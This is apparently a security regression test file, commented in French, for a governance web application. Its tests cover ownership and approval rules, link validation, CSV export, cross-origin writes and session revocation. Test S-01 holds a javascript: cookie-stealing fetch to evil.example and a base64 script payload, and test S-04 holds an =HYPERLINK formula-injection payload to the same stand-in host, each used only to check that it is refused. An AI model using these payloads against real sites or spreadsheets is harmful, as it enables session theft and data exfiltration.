/**
 * S-01 … S-11 — la campagne de sécurité.
 *
 * Chaque test rejoue une attaque qui a RÉUSSI avant correction, ou tient
 * une garantie qu'un futur changement pourrait retirer sans le vouloir.
 * L'ordre suit la gravité constatée, pas la commodité.
 */

import { test, before, after } from "node:test";
import assert from "node:assert";
import { boot, shutdown, as, SITE_PROJECT_GRU } from "./harness.js";
import { safeHref } from "../../web/src/ui/kit.js";

before(async () => { await boot(); });
after(shutdown);

/* ── S-06 · la preuve sans propriétaire s'approuvait elle-même ────── */

test("S-06 — un document déposé sans propriétaire porte son auteur, et ne s'approuve pas seul", async () => {
  const setup = await as("admin");
  await setup.patch("/api/admin/settings", { documentHosts: "docs.meridian.example" });

  /* Un compte RATTACHÉ à une personne (le responsable de programme DCH,
     PE-16) : ce qu'il dépose porte son nom, qu'il le dise ou non.
     Le rôle « admin » est délibérément hors de cette démonstration — il
     porte une exemption de séparation des tâches, documentée et assumée
     (S-12 au registre : à réexaminer, car sur un livre de production le
     seul compte actif est souvent administrateur). */
  const group = await as("groupDCH");
  const gdb = (await group.get("/api/bootstrap")).body.db;
  const gprj = gdb.projects.find(p => p.programme === "DCH");
  const made = await group.post("/api/documents", {
    project: gprj.id, name: "Preuve sans propriétaire déclaré", gate: 2,
    uri: "https://docs.meridian.example/s06.pdf",
  });
  assert.equal(made.status, 201, JSON.stringify(made.body));

  const doc = (await group.get("/api/bootstrap")).body.db.docs.find(d => d.id === made.body.id);
  assert.equal(doc.owner, "PE-16", "le déposant est enregistré comme propriétaire");

  /* …et donc l'indépendance a quelqu'un à comparer : le même compte ne
     peut pas approuver ce qu'il vient de déposer. */
  const self = await group.patch("/api/documents/" + made.body.id, { status: "Approved", version: 1 });
  assert.equal(self.status, 403, JSON.stringify(self.body));
});

test("S-06 — un document dont le propriétaire a été retiré n'est plus approuvable", async () => {
  const admin = await as("admin");
  const group = await as("groupDCH");
  const gprj = (await group.get("/api/bootstrap")).body.db.projects.find(p => p.programme === "DCH");
  const made = await group.post("/api/documents", {
    project: gprj.id, name: "Preuve orpheline", gate: 3, owner: "PE-19",
    uri: "https://docs.meridian.example/s06b.pdf",
  });
  await admin.patch("/api/documents/" + made.body.id, { owner: null, version: 1 });
  const r = await group.patch("/api/documents/" + made.body.id, { status: "Approved", version: 2 });
  assert.equal(r.status, 400, JSON.stringify(r.body));
  assert.match(r.body.error, /second pair of eyes|names no owner/i);
});

test("S-13 — l'exemption d'administrateur est explicite, et c'est une décision, pas un oubli", async () => {
  /* Un compte d'administration n'est rattaché à aucune personne : il ne
     peut pas être propriétaire, donc il n'est comparable à personne. Il
     approuve — comme il est exempté de TOUTE séparation des tâches, par
     conception documentée. Ce test fige cette réalité pour qu'un futur
     lecteur du registre voie le comportement plutôt que de le supposer :
     la correction n'est pas du code, ce sont des comptes nominatifs. */
  const admin = await as("admin");
  const made = await admin.post("/api/documents", {
    project: SITE_PROJECT_GRU, name: "Preuve déposée par le système", gate: 2,
    uri: "https://docs.meridian.example/s06c.pdf",
  });
  assert.equal(made.status, 201);
  const doc = (await admin.get("/api/bootstrap")).body.db.docs.find(d => d.id === made.body.id);
  assert.equal(doc.owner, null, "aucune personne derrière ce compte");
  const r = await admin.patch("/api/documents/" + made.body.id, { status: "Approved", version: 1 });
  assert.equal(r.status, 200, "l'exemption d'administrateur s'applique — voir S-13 au registre");
});

/* ── S-07 · l'identité de l'émetteur ne se déclare pas ───────────── */

test("S-07 — l'émetteur d'une demande est celui qui la pose, quoi qu'il prétende", async () => {
  const pm = await as("siteGRU");
  const raised = await pm.post("/api/change",
    { project: SITE_PROJECT_GRU, title: "CR sous alias", cost: 0.05, weeks: 1, raisedBy: "PE-04" });
  assert.equal(raised.status, 201, JSON.stringify(raised.body));

  const cr = (await pm.get("/api/bootstrap")).body.db.crs.find(c => c.id === raised.body.id);
  assert.equal(cr.raisedBy ?? cr.raised_by, "PE-19", "le serveur enregistre l'auteur réel");

  const self = await pm.post("/api/change/" + raised.body.id + "/approve", {});
  assert.equal(self.status, 403, "et l'indépendance tient donc encore");
});

/* ── S-01 · un lien est un emplacement, jamais du code ───────────── */

test("S-01 — le serveur refuse de stocker autre chose qu'une adresse http(s)", async () => {
  const pm = await as("siteGRU");
  for (const uri of [
    "javascript:fetch('https://evil.example/?'+document.cookie)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
  ]) {
    const r = await pm.post("/api/documents",
      { project: SITE_PROJECT_GRU, name: "Lien piégé", gate: 1, uri });
    assert.equal(r.status, 400, `« ${uri.slice(0, 24)}… » ne devrait pas se stocker`);
  }
  const ok = await pm.post("/api/documents",
    { project: SITE_PROJECT_GRU, name: "Lien honnête", gate: 1, uri: "https://docs.meridian.example/ok.pdf" });
  assert.equal(ok.status, 201, "une adresse ordinaire passe");
});

test("S-01 — et le client refuse d'en faire un href, même si un ancien enregistrement en porte un", () => {
  assert.equal(safeHref("https://docs.meridian.example/x.pdf"), true);
  assert.equal(safeHref("/relatif/ok"), true);
  assert.equal(safeHref("#ancre"), true);
  assert.equal(safeHref("javascript:alert(1)"), false);
  assert.equal(safeHref("JaVaScRiPt:alert(1)"), false, "la casse ne sauve pas");
  assert.equal(safeHref("java\tscript:alert(1)"), false, "ni une tabulation au milieu du schéma");
  assert.equal(safeHref(" javascript:alert(1)"), false, "ni une espace devant");
  assert.equal(safeHref("data:text/html,<script>"), false);
  assert.equal(safeHref(""), false);
});

/* ── S-05 · un nombre, ou le refus d'en inventer un ──────────────── */

test("S-05 — NaN et Infinity ne franchissent pas la porte (la base les accepterait)", async () => {
  const pm = await as("siteGRU");
  const p = (await pm.get("/api/bootstrap")).body.db.projects.find(x => x.id === SITE_PROJECT_GRU);
  for (const budget of ["NaN", "Infinity", "-Infinity"]) {
    const r = await pm.patch("/api/projects/" + SITE_PROJECT_GRU, { budget, version: p.version });
    assert.equal(r.status, 400, `budget = ${budget}`);
  }
  const ok = await pm.patch("/api/projects/" + SITE_PROJECT_GRU, { budget: 1.5, version: p.version });
  assert.equal(ok.status, 200);
});

/* ── S-03 · l'annuaire n'est pas public ──────────────────────────── */

test("S-03 — la liste des comptes ne publie que les comptes de démonstration", async () => {
  const admin = await as("admin");
  const made = await admin.post("/api/admin/users", {
    email: "vraie.personne@endeavour.example", displayName: "Vraie Personne",
    role: "viewer", password: "un-mot-de-passe-2026",
  });
  assert.equal(made.status, 201, JSON.stringify(made.body));

  const anon = await as(null);           // pas de session : c'est l'écran de connexion
  const r = await anon.get("/api/auth/accounts");
  assert.equal(r.status, 200, "l'écran de connexion doit rester servable");
  const emails = r.body.accounts.map(a => a.email);
  assert.ok(!emails.includes("vraie.personne@endeavour.example"),
    "un compte réel ne se publie pas à un visiteur anonyme");
  assert.ok(emails.every(e => e.endsWith("@meridian.example")),
    "seuls les comptes de démonstration paraissent");
});

/* ── S-02 · l'écriture depuis un autre site est refusée ──────────── */

test("S-02 — une écriture qui annonce une origine étrangère est refusée", async () => {
  const pm = await as("siteGRU");
  const r = await pm.post("/api/raid",
    { project: SITE_PROJECT_GRU, type: "Risk", title: "Depuis ailleurs", p: 2, i: 2 },
    { origin: "https://evil.example" });
  assert.equal(r.status, 403, JSON.stringify(r.body));
  assert.match(r.body.error, /Cross-site/i);

  /* Sans origine annoncée (client natif, script, la surveillance) on
     passe : la garantie est la cohérence, pas la présence d'un en-tête. */
  const plain = await pm.post("/api/raid",
    { project: SITE_PROJECT_GRU, type: "Risk", title: "Sans origine", p: 2, i: 2 });
  assert.equal(plain.status, 201);
});

/* ── S-04 · un export est une donnée, jamais une instruction ─────── */

test("S-04 — une cellule qui commence par = sort neutralisée du CSV", async () => {
  const admin = await as("admin");
  const made = await admin.post("/api/projects", {
    name: '=HYPERLINK("http://evil.example/?"&A1,"cliquez")',
    programme: "DCH", site: "GRU", governanceLevel: "site",
    start: "2027-01-04", finish: "2027-06-30",
  });
  assert.equal(made.status, 201);

  const csv = await admin.get("/api/export/dataset?format=csv");
  assert.equal(csv.status, 200);
  assert.ok(!/,"=HYPERLINK/.test(csv.text), "la formule ne doit pas rester exécutable");
  assert.match(csv.text, /"'=HYPERLINK/, "elle est rendue au texte par une apostrophe");
});

/* ── A-07 · un refus dit ce qui reste ouvert ─────────────────────── */

test("A-07 — chaque refus d'autorité nomme la suite à donner, dans les deux langues", async () => {
  const { can } = await import("../../shared/rbac.js");
  const { say } = await import("../src/i18n.js");
  const site = { id: "U", active: true, role: "site", personId: "PE-19",
    grants: { sites: new Set(["GRU"]), programmes: new Set() } };
  const viewer = { id: "V", active: true, role: "viewer", personId: "PE-12",
    grants: { sites: new Set(["LIS"]), programmes: new Set() } };

  const cases = [
    [site, "project.write", { project: { id: "P", governance_level: "group", site_id: "YYZ", programme_id: "X" } }],
    [site, "priority.write", {}],
    [site, "moc.approve", { project: { id: "P", governance_level: "site", site_id: "GRU", pm_id: "PE-19" } }],
    [site, "audit.read", {}],
    [viewer, "project.write", { project: { id: "P", governance_level: "site", site_id: "LIS" } }],
    [site, "document.approve", { project: { id: "P", governance_level: "site", site_id: "GRU" }, owner_id: "PE-19", gate: 2 }],
    [site, "period.close", {}],
    [site, "data.import", {}],
    [site, "concern.raise", { project: { id: "P", governance_level: "site", site_id: "GRU" } }],
  ];

  /* « Une suite » = un acteur qui prend le relais, ou une action qui
     reste ouverte. Un refus qui ne dit que l'état laisse la personne
     devant un mur : elle range le problème plutôt que de le porter. */
  const NAMES_A_WAY_ON = /bureau de programme|administrateur|collègue|responsable de site|préoccupation|reconnectez|demandez|voyez|ouvrez|confiez|transmettez|créez/i;

  const mute = [];
  for (const [u, action, res] of cases) {
    const v = can(u, action, res);
    if (v.ok) continue;
    const fr = say(v.why, "fr");
    assert.notEqual(fr, v.why, `« ${v.why} » n'est pas traduit`);
    if (!NAMES_A_WAY_ON.test(fr)) mute.push(action + " → " + fr);
  }
  assert.deepEqual(mute, [], "ces refus ne disent pas ce qui reste ouvert");
});

/* ── N-05 · une cadence offerte est une cadence tenue ────────────── */

test("N-05 — « hebdomadaire » ne reçoit pas comme « immédiat »", async () => {
  const { queue, deliver } = await import("../src/notify.js");
  const { query, many } = await import("../src/db.js");

  const pm = await as("siteGRU");
  const me = (await pm.get("/api/auth/me")).body.user;
  await pm.patch("/api/auth/preferences", { notifyPref: "weekly" });

  /* Un envoi récent, puis deux messages en file : la personne a demandé un
     lot par semaine, elle n'en reçoit pas deux dans la minute. */
  await query(`DELETE FROM notification WHERE user_id = $1`, [me.id]);
  await query(
    `INSERT INTO notification (user_id, email, kind, subject, body, state, sent_at, dedupe_key)
     VALUES ($1, $2, 'digest', 'lot précédent', '', 'sent', now() - interval '2 hours', 'n05-seed')`,
    [me.id, me.email]);
  await queue({ userId: me.id, email: me.email, kind: "digest",
    subject: "Nouveau 1", body: "x", dedupeKey: "n05-a" });
  await queue({ userId: me.id, email: me.email, kind: "digest",
    subject: "Nouveau 2", body: "x", dedupeKey: "n05-b" });

  const sentTo = [];
  const out = await deliver(async ({ subject }) => { sentTo.push(subject); });
  assert.equal(out.sent, 0, "rien ne part avant l'échéance de la cadence");

  const still = await many(
    `SELECT count(*)::int AS n FROM notification WHERE user_id = $1 AND state = 'queued'`, [me.id]);
  assert.equal(still[0].n, 2, "et rien n'est perdu — les messages attendent");

  /* Une fois la semaine écoulée, le lot part. */
  await query(`UPDATE notification SET sent_at = now() - interval '8 days'
                WHERE user_id = $1 AND state = 'sent'`, [me.id]);
  const after = await deliver(async ({ subject }) => { sentTo.push(subject); });
  assert.ok(after.sent >= 1, "à l'échéance, ce qui attendait part");

  await pm.patch("/api/auth/preferences", { notifyPref: "immediate" });
});

/* ── G-08 / G-10 / G-17 · ce que le comité InfoSec attendait du produit ── */

test("G-08 — un échec de connexion laisse un compte, et rien de plus", async () => {
  const { many } = await import("../src/db.js");
  const before = await many(
    `SELECT coalesce(sum(n), 0)::int AS n FROM usage_daily WHERE kind = 'sign-in-failed'`);

  const anon = await as(null);
  const r = await anon.post("/api/auth/login",
    { email: "g.silva@meridian.example", password: "ce-n-est-pas-le-bon" });
  assert.equal(r.status, 401);

  await new Promise((res) => setTimeout(res, 120));
  const after = await many(
    `SELECT coalesce(sum(n), 0)::int AS n FROM usage_daily WHERE kind = 'sign-in-failed'`);
  assert.ok(after[0].n > before[0].n, "l'échec est compté");

  /* Et le comptage ne peut pas dire QUI a échoué : le compteur en mémoire
     limite le débit, la table raconte le volume, et aucune des deux ne
     garde l'adresse essayée. */
  const cols = await many(
    `SELECT column_name FROM information_schema.columns WHERE table_name = 'usage_daily'`);
  assert.deepEqual(cols.map((c) => c.column_name).sort(), ["day", "kind", "n"]);
});

test("G-10 — l'interrupteur termine toutes les sessions, y compris la sienne", async () => {
  const { many } = await import("../src/db.js");
  const admin = await as("admin");
  await as("siteGRU");                      // une seconde session en vie
  const before = await many(`SELECT count(*)::int AS n FROM session`);
  assert.ok(before[0].n >= 2, "il y a bien plusieurs sessions ouvertes");

  const r = await admin.post("/api/admin/sessions/revoke-all", {});
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.ok(r.body.ended >= 2);

  assert.equal((await many(`SELECT count(*)::int AS n FROM session`))[0].n, 0,
    "plus une seule — celui qui appuie se reconnecte aussi");

  /* L'acte est sur la piste : couper les sessions de tout le monde n'est
     pas une commodité, c'est une décision qu'on assume. */
  const trail = await many(
    `SELECT detail FROM audit_event WHERE action = 'All sessions revoked' ORDER BY id DESC LIMIT 1`);
  assert.match(trail[0].detail, /session\(s\) ended/);
});

test("G-10 — un compte non administrateur n'a pas d'interrupteur", async () => {
  const group = await as("groupDCH");
  assert.equal((await group.post("/api/admin/sessions/revoke-all", {})).status, 403);
});

test("G-17 — ce qui sort dit ce que c'est, et à qui", async () => {
  const admin = await as("admin");
  const csv = await admin.get("/api/export/dataset?format=csv");
  assert.match(csv.text, /^﻿?# INTERNAL/, "le fichier s'annonce");
  assert.match(csv.text, /issued to /);

  const pack = await admin.get("/api/projects/" + SITE_PROJECT_GRU + "/evidence");
  assert.match(pack.body.markdown, /INTERNAL — governance evidence/,
    "un dossier de preuve circule : il porte sa classification");
});
